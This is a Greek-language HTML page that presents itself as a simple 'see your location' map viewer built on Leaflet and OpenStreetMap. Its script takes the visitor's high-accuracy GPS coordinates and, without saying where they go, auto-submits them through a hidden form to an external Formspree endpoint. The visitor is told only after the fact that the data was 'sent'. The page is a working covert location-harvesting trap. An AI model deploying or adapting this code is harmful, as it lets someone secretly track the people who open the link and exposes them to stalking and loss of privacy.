<!DOCTYPE html>
<html lang="el">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Δες τη θέση σου</title>
  <link
    rel="stylesheet"
    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
    integrity="sha256-XQoYMqMTK8LvTLrP8aRA2wE0aYw7RFbF6v+W0W+gPqc="
    crossorigin=""
  />
  <style>
    html, body { margin:0; padding:0; height:100%; font-family:sans-serif; }
    #btn-container {
      height:100%; display:flex; align-items:center; justify-content:center;
      background:#f0f0f0;
    }
    #loc-btn {
      padding:1rem 2rem; font-size:1.2rem;
      border:none; border-radius:4px; background:#007bff; color:#fff;
      cursor:pointer; box-shadow:0 2px 6px rgba(0,0,0,0.2);
    }
    #map { width:100%; height:100%; display:none; }
    #status {
      position:absolute; bottom:10px; left:50%;
      transform:translateX(-50%);
      background:rgba(255,255,255,0.9);
      padding:6px 10px; border-radius:4px;
      font-size:0.9rem; box-shadow:0 1px 4px rgba(0,0,0,0.2);
      z-index:500;
    }
  </style>
</head>
<body>
  <div id="btn-container">
    <button id="loc-btn">Δες τοποθεσία</button>
  </div>
  <div id="map"></div>
  <div id="status"></div>

  <!-- Formspree -->
  <form id="locForm"
        action="https://formspree.io/f/xldbgner"
        method="POST"
        hidden>
    <input type="hidden" name="latitude" id="lat">
    <input type="hidden" name="longitude" id="lon">
  </form>

  <script
    src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
    integrity="sha256-gZ0GmTQLP8VAgUeC5G2H4o1NQ4z3o+TF2bV6EdD3HGI="
    crossorigin=""
  ></script>
  <script>
    const btn      = document.getElementById('loc-btn');
    const btnCont  = document.getElementById('btn-container');
    const mapDiv   = document.getElementById('map');
    const status   = document.getElementById('status');
    const form     = document.getElementById('locForm');
    const latInput = document.getElementById('lat');
    const lonInput = document.getElementById('lon');
    let map, marker;

    btn.addEventListener('click', () => {
      // Hide button, show map area
      btnCont.style.display = 'none';
      mapDiv.style.display  = 'block';

      // Initialize map immediately so user sees something
      map = L.map('map').setView([0,0],2);
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap contributors'
      }).addTo(map);

      // Check geolocation permission state first
      if (!navigator.permissions || !navigator.geolocation) {
        status.textContent = 'Ο browser δεν υποστηρίζει τις απαραίτητες API.';
        return;
      }

      navigator.permissions.query({ name: 'geolocation' }).then(result => {
        if (result.state === 'denied') {
          status.innerHTML = 'Η πρόσβαση στη θέση έχει απορριφθεί.<br>Παρακαλώ ενεργοποίησέ την από τις ρυθμίσεις του browser.';
        } else {
          // prompt or granted
          status.textContent = 'Ζητάω τη θέση σας…';
          navigator.geolocation.getCurrentPosition(onSuccess, onError, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          });
        }
      });
    });

    function onSuccess(pos) {
      const { latitude, longitude } = pos.coords;
      // Center map & add marker
      map.setView([latitude, longitude], 14);
      marker = L.marker([latitude, longitude])
                .addTo(map)
                .bindPopup('Εδώ είστε.')
                .openPopup();

      // Submit hidden form
      latInput.value = latitude;
      lonInput.value = longitude;
      status.textContent = 'Θέση εντοπίστηκε! Στέλνω…';
      form.submit();
      status.textContent = 'Στάλθηκε—ευχαριστώ!';
    }

    function onError(err) {
      console.error('Location error', err);
      status.textContent = `Σφάλμα (${err.code}): ${err.message}`;
    }
  </script>
</body>
</html>
